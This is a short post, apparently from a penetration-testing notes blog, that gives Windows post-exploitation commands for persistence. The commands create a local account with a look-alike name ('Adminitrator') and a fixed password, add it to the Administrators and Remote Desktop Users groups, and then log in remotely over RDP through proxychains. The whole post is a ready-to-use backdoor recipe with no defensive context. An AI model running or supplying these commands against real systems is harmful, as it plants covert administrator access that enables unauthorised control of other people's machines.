---
layout: post
title:  "post exploitation - windows - persistence - add administrator user"
date:   2022-01-01
categories: windows
---


```powershell

net user Adminitrator TurnU2C@ndy!! /add
net localgroup Administrators Adminitrator /add
net localgroup "Remote Desktop Users" Adminitrator /add

proxychains xfreerdp /v:<target ip>  /u:Adminitrator /p:'TurnU2C@ndy!!'

```